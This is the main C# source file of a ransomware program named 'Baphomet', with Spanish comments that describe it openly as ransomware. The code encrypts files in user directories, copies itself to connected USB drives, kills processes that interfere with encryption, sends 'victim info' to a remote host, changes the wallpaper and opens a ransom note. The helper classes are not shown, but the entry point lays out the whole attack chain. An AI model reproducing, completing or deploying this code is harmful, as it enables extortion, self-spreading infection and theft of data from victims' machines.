using Baphomet.Models;
using Baphomet.Utilities;
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet
{
    public class Program 
    {
        static void Main()
        {
            Cryptep cryptep = new Cryptep();
            BackgroundPhoto photo = new BackgroundPhoto();
            NetInfo netInfo = new NetInfo();
            Diagnostics diag = new Diagnostics();

            var key = cryptep.GenerateKey();
            var userName = Environment.UserName;

            //Directorios donde los usuarios suelen guardar sus archivos ("Desktop","Documents","Pictures" etc)
            //Aqui pondremos los directorios que deseamos cifrar.
            var path_dirs = new[] { "\\Downloads\\test" };
            var  userDir = Path.Combine("C:\\Users\\",userName);

            var devicesLst = diag.GetUsbDevices();//Obtengo una lista de los usb conectados a la maquina.
            if(devicesLst.Count != 0)
                diag.AutoCopy(devicesLst);//Intento copiar mi ransomware en los usb.
           
            //Verifico y mato los procesos que puedan interferir con el cifrado de archivos. 
            diag.CheckProccess();
            for (int d = 0; d < path_dirs.Length; d++)//recorro cada uno de los dirs validos
            {
                var targetPath = userDir + path_dirs[d];
                cryptep.directoryRoad(targetPath, key);
            }

            //Verifico si tengo conecxion a internet.
            var internet_connection = netInfo.CheckInternetConnection();
            if(internet_connection != false)
            {
                //Obtengo la data de la victima una vez cifre todos los directorios.
                var victimInfo = netInfo.GetVictimInfo();
                var host = netInfo.HostName();//busco un host vivo en mi lista de hostnames.
                if (host != "noLive")
                    netInfo.SendData(victimInfo, host);
            }
            //Cambio el wallpaper Desktop
            //podemos usar el metodo imageBase64() donde tendremos una imagen default en base64, o tambien podriamos usar UrlImage() para descargar la foto que deseemos.
            var wallpaper = photo.imageBase64();
            photo.ChangeWallpaper(wallpaper,userDir);

            var note_path = Path.Combine(userDir, "Desktop");
            photo.OpenNote(note_path);


        }//</main>
    }
}
